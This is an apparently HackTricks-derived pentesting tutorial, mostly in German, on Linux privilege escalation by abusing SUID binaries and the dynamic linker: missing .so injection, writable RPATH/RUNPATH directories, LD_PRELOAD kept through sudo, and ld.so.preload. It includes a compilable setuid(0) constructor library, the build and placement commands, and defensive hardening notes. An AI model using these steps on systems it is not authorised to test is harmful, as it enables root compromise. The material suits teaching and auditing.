# Missbrauch von SUID Shared Libraries und Linker

SUID-Binaries werden normalerweise auf direkte Befehlsausführung überprüft, aber benutzerdefinierte SUID-Programme können auch über den dynamischen Linker verwundbar sein. Das gemeinsame Muster ist einfach: Eine privilegierte ausführbare Datei lädt Code aus einem Pfad oder einer Konfiguration, die ein Benutzer mit geringeren Berechtigungen beeinflussen kann.<sup>[[1]](#references)</sup>

Diese Seite konzentriert sich auf allgemeine Technikmuster: fehlende Libraries, beschreibbare Library-Verzeichnisse, `RPATH`/`RUNPATH`, `LD_PRELOAD` über sudo, die Linker-Konfiguration und SUID-Hardlink-Verwechslungen.

## Schnelle Enumeration

Beginne damit, ungewöhnliche SUID-Dateien zu finden und zu überprüfen, ob sie dynamisch gelinkt sind:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Konzentriere dich auf nicht standardmäßige Speicherorte, benutzerdefinierte Anwendungspfade, Binaries, die root gehören, sich aber außerhalb paketverwalteter Verzeichnisse befinden, sowie auf Abhängigkeiten, die aus beschreibbaren Verzeichnissen geladen werden.<sup>[[1]](#references)</sup>

Nützliche Prüfungen der Schreibrechte:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Einige benutzerdefinierte SUID-Binaries versuchen, ein Shared Object zu laden, das nicht existiert. Befindet sich der fehlende Pfad in einem vom Angreifer kontrollierten Verzeichnis, lädt das Binary möglicherweise vom Angreifer bereitgestellten Code als effektiver Benutzer.<sup>[[1]](#references)</sup>

Finde fehlgeschlagene Bibliotheksabfragen mit dem Syscall-Filter von `strace`:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Wenn die Binary in einem beschreibbaren Pfad nach `libexample.so` sucht, kann eine minimale Proof-Library einen Konstruktor verwenden. Halte den Proof-of-Impact während der Validierung harmlos:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Erstelle es mit dem exakten Dateinamen, den die Binärdatei zu laden versucht:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Die ausnutzbare Bedingung ist nicht allein die fehlende Bibliothek. Der Angreifer muss ein kompatibles Shared Object in einem Pfad platzieren können, den der privilegierte Loader akzeptiert.<sup>[[1]](#references)</sup>

## Schreibbares Bibliotheksverzeichnis

Manchmal sind alle Abhängigkeiten vorhanden, aber eines der Verzeichnisse, die zu ihrer Auflösung verwendet werden, ist beschreibbar. Dies kann das Ersetzen einer geladenen Bibliothek oder das Platzieren einer Bibliothek mit höherer Priorität und demselben Namen ermöglichen.<sup>[[1]](#references)</sup>

Abhängigkeitspfade überprüfen:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Wenn das Verzeichnis beschreibbar ist, validiere dies in einer Laborumgebung mit einem kopiersicheren Ansatz. Das Ersetzen von Systembibliotheken auf einem aktiven Host kann dazu führen, dass gleichzeitig gestartete Prozesse inkonsistente Bibliotheksversionen verwenden.<sup>[[8]](#references)</sup>

## RPATH und RUNPATH

`RPATH` und `RUNPATH` sind Einträge im dynamischen Abschnitt, die dem Loader mitteilen, wo nach Bibliotheken gesucht werden soll. Sie sind in SUID-Programmen gefährlich, wenn sie auf für Angreifer beschreibbare Verzeichnisse verweisen.<sup>[[1]](#references)</sup>

Erkenne sie:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Beispiel für riskante Ausgabe:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Wenn `/opt/app/lib` beschreibbar ist und die Binärdatei `libcustom.so` benötigt, kann der Angreifer möglicherweise dort eine schädliche `libcustom.so` platzieren:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` und `RUNPATH` sind hinsichtlich aller Auflösungsdetails nicht identisch, aber für einen Privilege-Escalation-Review ist die praktische Frage dieselbe: Durchsucht das SUID-Binary ein für Angreifer beschreibbares Verzeichnis nach einem Library-Namen?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH und SUID

Bei normalen Programmen können `LD_PRELOAD` und `LD_LIBRARY_PATH` das Laden von Shared Objects erzwingen oder beeinflussen. Bei SUID-Programmen wechselt der Dynamic Loader normalerweise in den Secure-Execution-Modus und ignoriert gefährliche Umgebungsvariablen.<sup>[[1]](#references)</sup>

Das bedeutet, dass ein einfaches SUID-Binary normalerweise nicht allein deshalb verwundbar ist, weil der Benutzer `LD_PRELOAD` setzen kann:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Die häufige Ausnahme ist eine sudo-Richtlinie, die das Setzen oder Beibehalten von Loader-Variablen für den Zielbefehl erlaubt. Überprüfe `sudo -l` auf Einträge wie `env_keep+=LD_PRELOAD` oder `env_keep+=LD_LIBRARY_PATH`; wenn das Ziel dynamisch gelinkt ist, kann es vom Angreifer kontrollierten Code laden:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Verwechsle diese Fälle nicht; die Loader- und sudo policy rules oben unterscheiden sie:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` gegen eine normale SUID-Binary: wird durch secure execution normalerweise blockiert.
- Von sudo beibehaltenes `LD_PRELOAD`: potenziell ausnutzbar.
- Fehlende `.so` in einem beschreibbaren Pfad: ausnutzbar, wenn die SUID-Binary diesen Pfad natürlicherweise lädt.
- `RPATH`/`RUNPATH` zu einem beschreibbaren Verzeichnis: ausnutzbar, wenn eine benötigte Library kontrolliert werden kann.
- Schreibzugriff auf `/etc/ld.so.preload` oder die Linker-Konfiguration: systemweit und mit hohen Auswirkungen.

## Linker-Konfiguration

`ld.so` verwendet den Linker-Cache und `/etc/ld.so.preload`; `ldconfig` erstellt diesen Cache aus `/etc/ld.so.conf` und den daraus eingebundenen Dateien, üblicherweise aus `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Prüfungen mit hohem Wert:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Eine beschreibbare Linker-Konfiguration ist normalerweise schwerwiegender als eine einzelne verwundbare SUID-Binärdatei, da sie viele dynamisch gelinkte Prozesse beeinflussen kann. `/etc/ld.so.preload` ist besonders gefährlich, weil es ein Shared Object in privilegierte Prozesse erzwingen kann.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks können dafür sorgen, dass derselbe SUID-Inode unter mehreren Namen erscheint.<sup>[[9]](#references)</sup> Dies ist nützlich, um einen privilegierten Helfer zu verstecken, die Bereinigung zu erschweren oder eine naive pfadbasierte Überprüfung zu umgehen.

Finde SUID-Dateien mit mehr als einem Link:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Überprüfe alle Pfade zur selben Inode:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
The abuse is not that a hardlink changes permissions. The abuse is path confusion: a privileged inode may be reachable through a name that defenders or scripts do not expect.<sup>[[9]](#references)</sup> For deeper inode and hardlink workflow, see [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Keep SUID binaries minimal, audited, and package-managed where possible.
- Avoid `RPATH`/`RUNPATH` entries pointing to writable or application-managed directories.<sup>[[1]](#references)[[8]](#references)</sup>
- Keep library directories root-owned and non-writable by regular users.<sup>[[8]](#references)</sup>
- Do not preserve `LD_PRELOAD`, `LD_LIBRARY_PATH`, or similar loader variables through sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Monitor `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, and unexpected SUID files.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Review hardlinked SUID files and investigate custom SUID wrappers outside standard system paths.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)

{{#include ../../banners/hacktricks-training.md}}
